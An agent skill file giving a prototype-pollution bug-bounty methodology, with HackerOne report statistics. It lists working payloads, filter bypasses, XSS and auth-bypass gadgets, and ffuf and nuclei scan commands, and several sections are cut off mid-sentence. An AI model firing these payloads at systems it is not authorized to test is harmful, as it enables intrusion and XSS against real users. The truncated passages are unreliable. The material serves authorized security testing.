---
name: bbhunt-prototype-pollution
description: "Use for __proto__/constructor.prototype injection in JSON bodies, query parsing, and merge/clone utilities, and for client-side gadget exploitation. Unified from 2 upstream skills (h1skills, hunting). Plus evidence from all 15,259 disclosed HackerOne reports. For authorized security testing only."
agent_created: true
---

# Prototype Pollution — unified methodology

> **Unified skill.** Built from 2 upstream skills across h1skills, hunting and the local HackerOne corpus. Full originals are in `references/upstream-*.md`; the deduplicated union is in `references/unified-method.md`.

## Corpus-backed method (this class)

1. Identify the parsing and merge path for JSON/query/body input; test whether special keys survive parsing.
2. Confirm pollution with a harmless property and an observable side effect (an object gaining an unexpected property).
3. Fingerprint libraries and versions to find real gadgets; a polluted property alone is not impact.
4. For client-side pollution, look for sinks in DOM APIs, template engines, and option objects.
5. Prove a security consequence: auth/property override, XSS gadget, or RCE where the stack supports it.

### Signals

- JavaScript/Node stack with merge/extend/clone utilities
- JSON keys accepted verbatim, including __proto__ or constructor
- Framework gadgets that read polluted properties

### Kill criteria

- Parser strips or blocks special keys at every entry point.
- Pollution occurs but no gadget turns it into a security effect.
- Only a local Node process you cannot influence as an attacker.

### Escalation chains

- Prototype pollution -> property override -> auth bypass.
- Client pollution -> DOM gadget -> XSS.

### Veteran tip

Gadget discovery is the whole game — fingerprint the framework before spending time on payload variants.

## Unified upstream methodology (deduplicated)

### Discovery and hunting method

### Quick wins

Start here. These are the highest-yield tests for this class.

- Find recursive merge/clone helpers and query parsers (jQuery.extend, lodash.merge, qs).
- Try __proto__, constructor.prototype, and prototype in query strings, JSON, cookies.
- Confirm pollution with `({}).polluted` and a downstream gadget.
- Test server-side Node.js merge paths too.

### Deeper checklist

- Find recursive merge/clone helpers and query-string parsers (jQuery.extend, lodash.merge, qs, yargs).
- Try `__proto__`, `constructor.prototype`, and `prototype` in query strings, JSON bodies, and cookies.
- Confirm pollution via `({}).polluted` in the console or a downstream gadget.
- Chain to XSS (DOM sinks), auth bypass, or DoS via polluted options.
- Test server-side Node.js merge paths as well as browser bundles.
- Check library versions against known prototype-pollution CVEs.

### A. Discovery checklist — concrete places, params, headers, flows to look

- Work the **source → gadget → sink** model explicitly (OWASP WSTG / PortSwigger). Pollution alone is rarely a finding: you need (1) an input that reaches a recursive merge/clone/path-assignment, and (2) code that later reads the planted property and uses it in a sensitive sink.
- Client-side source probes, in order (PortSwigger Academy): append each to every interesting URL and inspect `Object.prototype` in the console:
  - `/?__proto__[foo]=bar` (bracket notation)
  - `/?__proto__.foo=bar` (dot notation)
  - `/#__proto__[foo]=bar` (hash/fragment routes)
  - postMessage bodies carrying `{"__proto__":{"foo":"bar"}}`
  - JSON body reflection: `{"__proto__":{"foo":"bar"}}` on profile/settings/config endpoints.
- If `__proto__` is filtered, try the **constructor path** — every non-null-prototype object exposes `constructor.prototype`: `?constructor[prototype][foo]=bar`, `?constructor.prototype.foo=bar`. This defeats the common "strip `__proto__` key" defense.
- If keys are sanitized once, try **recursive-stripping bypass**: `__pro__proto__to__.gadget=payload` reduces to `__proto__.gadget=payload` when the sanitizer removes `__proto__` a single time. Also try URL-encoded, double-encoded, and Unicode-variant forms (`%5f%5fproto%5f%5f`, `\u005f\u005fproto\u005f\u005f`).
- Library fingerprints to grep JS bundles for: `_.merge`, `_.defaultsDeep`, `_.set`, `_.setWith`, `jQuery.extend(true,...)`, `lodash.merge`, `Object.assign`, `$.extend`, `merge` from `deepmerge`, `mergeWith`. Check versions: lodash < 4.1

### Signals and surfaces

### Signal

- Reports: **59** · paid: **2**
- Median bounty **$3,000** · p90 **$3,000** · max **$3,000** · total **$6,000**
- Median upvotes **5**

### Where it pays

| Program | Reports | Bounty | Upvotes |
|---|---|---|---|
| GitLab | 2 | $6,000 | 106 |
| Node.js third-party modules | 47 | $0 | 260 |
| Node.js | 4 | $0 | 49 |
| ExpressionEngine | 2 | $0 | 51 |
| Elastic | 1 | $0 | 157 |
| 8x8 | 1 | $0 | 17 |
| Stripe | 1 | $0 | 17 |
| Automattic | 1 | $0 | 7 |

### Where to look

Parameters, endpoints, and fields that commonly carry this bug:

`query string` `JSON body` `cookies` `config` `merge`

### Techniques, payloads and bypasses

### Payloads & probes

- `?__proto__[polluted]=yes` `?constructor[prototype][polluted]=yes`
- `{"__proto__":{"isAdmin":true}}`
- `a[__proto__][x]=1` in qs/body-parser

### Bypass tricks

- Bypass filters with `constructor.prototype` and nested keys.
- Chain to DOM XSS via polluted options.

### Techniques from real reports

One concrete lesson per report (mined from the writeup), newest and most-upvoted first. Read 5–10 before testing.

- **Prototype Pollution leads to XSS on https://blog.swiftype.com/#__proto__[asd]=alert(document.domain)** — `#998398` · Elastic · $0 · ▲157
  > https://blog.swiftype.com/ proto [asd]=alert(document.domain)
- **Stored XSS via Mermaid Prototype Pollution vulnerability** — `#1106238` · GitLab · $3,000 · ▲58
  > Syntax for declaring the directive is `%%{init: {<JSON OBJECT }}%%`
- **Stored XSS via Mermaid Prototype Pollution vulnerability** — `#1280002` · GitLab · $3,000 · ▲48
  > Open https://gitlab.com/cataha319/stored-xss/-/issues/2
- **Type Juggling -> PHP Object Injection -> SQL Injection Chain** — `#202774` · ExpressionEngine · $0 · ▲40
  > The full details of this vulnerability can be found here: https://foxglovesecurity.com/2017/02/07/type-juggling-and-php-object-injection-and-sqli-oh-my/
- **property-expr - Prototype pollution** — `#910206` · Node.js third-party modules · $0 · ▲33
  > npm page: `https://www.npmjs.com/package/property-expr`
- **Denial of Service via `__proto__` header name in `req.headersDistinct` (Uncaught `TypeError` crashes Node.js process)** — `#3560402` · Node.js · $0 · ▲22
  > When this occurs, `dest[" proto "]` resolves to `Object.prototype` rather than `undefined`, causing `.push()` to be called on a non-array.
- **Prototype pollution attack (lodash)** — `#712065` · Node.js third-party modules · $0 · ▲20
  > npm page: https://www.npmjs.com/package/lodash
- **Jitsi: Bridge Message Spoofing due to Im

### Payload fragments observed

Recurring payloads from this class's writeups. Adapt, don't paste blindly.

| Seen | Fragment |
|---:|---|
| 15× | `__proto__` |
| 4× | `{__proto__: {...}}` |
| 4× | `$.extend` |
| 3× | `{constructor: {prototype: {...}}}` |
| 3× | `@firebase/util` |
| 2× | `%%{init: { '__proto__': {'polluted': 'asdf'}} }%% / sequenceDiagram / Alice->>Bob: Hi Bob / Bob->>Alice: Hi Alice` |
| 2× | `fix(misc) use safeJsonParse from js-utils` |
| 2× | `{"text":"a","title":{"__proto__":{"where":{"name":"sqlinjection","where":null}}}}` |
| 2× | `__proto__.polluted` |
| 1× | `%%{init: {<JSON_OBJECT>}}%%` |
| 1× | `\n${cnf.themeCSS}` |
| 1× | `\n:root { --mermaid-font-family: ${cnf.fontFamily}}` |
| 1× | `\n:root { --mermaid-alt-font-family: ${cnf.altFontFamily}}` |
| 1× | `let expr = require('property-expr') / obj = {} / expr.setter('constructor.prototype.isAdmin')(obj,true) / console.log({}.isAdmin) // true` |
| 1× | `dest["__proto__"]` |
| 1× | `.push()` |
| 1× | `ref: Cleanup BridgeChannelMessage (remove unnecessary type field).` |
| 1× | `POST /auth/login / {"email":{"email":1},"password":"1234"}` |
| 1× | `> console.table({a: 1, b: 1, c: 1}, ['__proto__']) / Uncaught TypeError: Cannot create property '0' on string '' / > Object.prototype / [Obj` |
| 1× | `const keys = properties \\|\\| ObjectKeys(item); / for (const key of keys) { / + if (key === '__proto__') { / + continue / + } / if (map[key]` |

### B. Techniques & bypasses — specific actionable techniques/payload shapes

- Manual source confirmation: `Object.prototype.foo` in DevTools returns `"bar"` → polluted; `undefined` → not. Never infer success from the page's visible behavior alone.
- Browser-API gadgets (PortSwigger "Widespread prototype pollution gadgets"):
  - `Object.prototype.body="foo=bar"; fetch('/', {method:"POST"})` — controls the options object the site doesn't fully populate.
  - `Object.defineProperty` descriptor poisoning via `Object.prototype.value`: even a `writable:false, configurable:false` property can be overwritten if the descriptor omits `value`.
  - `Object.prototype.configurable = true` can make a property redefinable → possible sandbox escape.
  - `localStorage.foo` (property access) inherits the polluted value; `localStorage.get('foo')` does not.
- Lab-grade client PoC: `/?__proto__[transport_url]=data:,alert(1);` where an undefined `config.transport_url` flows into a dynamically appended `<script src>`; GTM's `sequence` needs a trailing `-` because it lands in a numeric JS expression (`?__proto__[sequence]=alert(document.domain)-`).
- **Server-side, non-destructive detection** (PortSwigger Research, use these — a naive pollution can persist for the whole Node process and DoS the app):
  - `{"__proto__":{"json spaces":" "}}` → later JSON responses gain indentation (Express ≤ 4.17.3).
  - `{"__proto__":{"exposedHeaders":["foo"]}}` → response gains `Access-Control-Expose-Headers: foo` (requires CORS module).
  - `{"__proto__":{"status":555}}` → pick an obscure 4xx/5xx; force an error 

### Validation and proof

### Reporting bar

- Prove real impact on a second controlled account or a safe callback.
- Keep the PoC minimal and reproducible; include raw requests and exact IDs.
- Stay inside program scope and follow disclosure rules.

### C. Validation / proof bar — how to confirm and avoid false positives

- **Never start with a destructive probe.** Server-side pollution lasts for the lifetime of the Node process; a bad `encoding`, `Object.keys`, or `body` pollution can take the app down for everyone. Always begin with `status`, `json spaces`, `exposedHeaders`, or `OPTIONS` probes and a unique probe value.
- Confirm on a **second, independent request** after the polluting request (pollution must persist across requests), and confirm the change reverts when the polluting property is removed where possible. A one-off reflection is not pollution.
- For client-side, require both halves: a verified polluted property *and* a gadget reaching a real sink (`innerHTML`, `eval`, `script.src`, `setTimeout`, `fetch`). A polluted `Object.prototype` with no reachable gadget is typically closed as informational — say so in the report rather than claiming XSS.
- Prefer DOM Invader's Exploit-generated `alert()` as the client proof; for server-side, capture before/after response pairs (header set, status code, JSON indentation) with the exact polluting body.
- For RCE/OAST claims, require an actual Collaborator/DNS interaction tied to a unique token, not a WAF that scrapes hostnames. The doubled-quote obfuscated payload reduces that false positive.
- Third-party gadget findings: name the library and version and show the site loads it; Google has historically declined to fix GTM/GA gadgets, arguing it's the site's responsibility to avoid pollution sources — report to the site.
- Avoid the classic false positive: `hasOwnPro

### Escalation and related chains

### Escalation chains

- Prototype pollution -> DOM XSS.
- Prototype pollution -> auth bypass.

### Type Juggling -> PHP Object Injection -> SQL Injection Chain

`#202774` · ExpressionEngine · $0 · n/a · 2017-02-07 · ▲40
> Justin Kennedy identified a Type Juggling vulnerability in ExpressionEngine that allowed access to unserialize using user supplied data, ultimately achieving SQL Injection. The full details of this vulnerability can be found here: https://foxglovesecurity.com/2017/02/07/type-juggling-and-php-object-injection-and-sqli-oh-my/

### Tools and wordlists

### Tools

`Burp` · `DOM Invader` · `ppmap` · `browser console`

### Wordlists

Mined from this class's writeups and ready for `ffuf`/`feroxbuster`. Paths and parameters recur across programs; verify each hit.

| File | Entries |
|---|---:|
| `~/.local/share/hackerone-reports/wordlists/paths_prototype-pollution.txt` | 52 |
| `~/.local/share/hackerone-reports/wordlists/paths.txt` (global) | 500 |
| `~/.local/share/hackerone-reports/wordlists/params.txt` (global) | 400 |

```sh
W=~/.local/share/hackerone-reports/wordlists
ffuf -u https://target/FUZZ -w $W/paths_prototype-pollution.txt \
     -mc all -fc 404 -fs 0 -rate 40
```

### Nuclei

Scanner coverage is minimal; test merge/query parsers and confirm a downstream gadget.

```sh
nuclei -u https://target -tags prototype-pollution \
       -severity low,medium,high,critical -rl 40 -o nuclei_prototype-pollution.txt
# authenticated surface: add -H 'Cookie: session=...' or -H 'Authorization: Bearer ...'
```

Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.

## Source skills merged into this topic

- `h1skills` — `hackerone-prototype-pollution`
- `hunting` — `prototype-pollution`

## References

- `references/unified-method.md` — complete deduplicated union of all upstream sections
- `references/upstream-*.md` — full original SKILL.md from each contributing repo
- `references/upstream-assets/` — 2 companion files (payload/technique references, scripts, validators and schemas) from the contributing skills
- `../../upstream/` — complete unmodified archives of all five source repositories
- `references/evidence.md` — corpus technique frequencies, parameters, case studies and payload bank
- `bbhunt-methodology` — orchestrator, state machine and class router
